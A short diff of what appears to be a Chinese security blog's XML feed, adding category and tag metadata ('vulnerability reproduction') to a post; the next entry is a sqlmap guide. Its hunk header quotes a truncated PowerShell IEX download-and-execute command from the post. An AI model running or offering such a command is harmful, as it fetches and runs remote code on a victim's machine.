@@ -106,6 +106,12 @@ windwos(不需要编码处理): powershell IEX (New-Object Net.WebClient).Downlo
 
 
 ]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>复现</tag>
+      </tags>
   </entry>
   <entry>
     <title>sqlmap详解</title>
